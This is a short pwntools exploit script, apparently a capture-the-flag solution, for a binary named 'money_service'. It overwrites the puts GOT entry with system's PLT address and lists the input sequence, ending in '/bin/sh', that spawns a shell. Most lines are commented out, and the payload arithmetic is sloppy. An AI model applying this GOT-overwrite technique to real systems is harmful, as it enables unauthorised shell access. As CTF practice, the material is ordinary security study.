# I know how to get a shell (2023-11-23)
from pwn import *

context.log_level = "debug"
# p = remote('141.164.48.98', '30008')
# p = process("./money_service")

hidden_arg = 0x31337
puts_got = 0x602020
system_plt_6 = 0x4006f6

payload = puts_got
payload += system_plt_6


# pause()
# p.sendline(payload)
# p.interactive()

# 201527
# 6299680
# 4196086
# 1
# "/bin/sh"
# 2
# Then, Get Shell!